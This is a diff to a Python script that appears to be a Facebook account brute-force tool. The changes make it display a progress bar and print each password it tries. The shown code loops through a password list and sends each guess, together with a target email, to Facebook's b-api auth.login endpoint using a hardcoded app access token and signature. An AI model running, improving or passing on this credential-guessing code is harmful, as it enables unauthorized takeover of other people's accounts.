@@ -38,26 +38,28 @@ def fetch_facebook_data():
         os.system('clear')  # Clear the screen
         print(banner)
         print(internet)
-        print('\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mFetching data files from facebook...')
-        time.sleep(2)
-
+        print('\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mFetching data files from facebook...')
+        
         # Simulate progress bar
         toolbar_width = 25
-        sys.stdout.write('[')
-        for _ in range(toolbar_width):
-            sys.stdout.write('#')
+        for _ in range(toolbar_width + 1):
+            sys.stdout.write('\r')
+            sys.stdout.write('\033[37;1m[')
+            sys.stdout.write('\033[36;1m#\033[37;1m' * _)
+            sys.stdout.write('\033[37;1m]')
+            sys.stdout.write(' ~> Success' if _ == toolbar_width else '')
             sys.stdout.flush()
             time.sleep(0.1)
-        sys.stdout.write(']\n')
-        sys.stdout.flush()
+
+        print()  # Print a new line after progress bar completes
 
         # Check internet connection by making a request to Facebook
         response = requests.get('http://facebook.com')
         response.raise_for_status()  # Raise an exception for HTTP errors
-        print('\033[37;1m] \033[35;1m~> \033[32;1mSuccess ')
+        print('\n\033[32;1m[+] \033[37;1mSuccess ')
         time.sleep(2.0)
     except (ConnectionError, requests.exceptions.RequestException) as e:
-        print('\033[37;1m]\033[35;1m ~>\033[31;1m No Connection')
+        print('\n\033[31;1m[!] \033[37;1mNo Connection')
         print(e)  # Print the error message
         sys.exit()
 
@@ -82,7 +84,8 @@ def start():
             pw = pw.strip()  # Remove leading/trailing whitespace and newline characters
             try:
                 # Print the password being used from generate.txt
-                print('[=] Getting Password --> {}'.format(pw))
+                sys.stdout.write(f'[=] Getting Password --> {pw}\r')
+                sys.stdout.flush()
 
                 # Perform login attempt using the password
                 response = requests.get(f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={pw}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
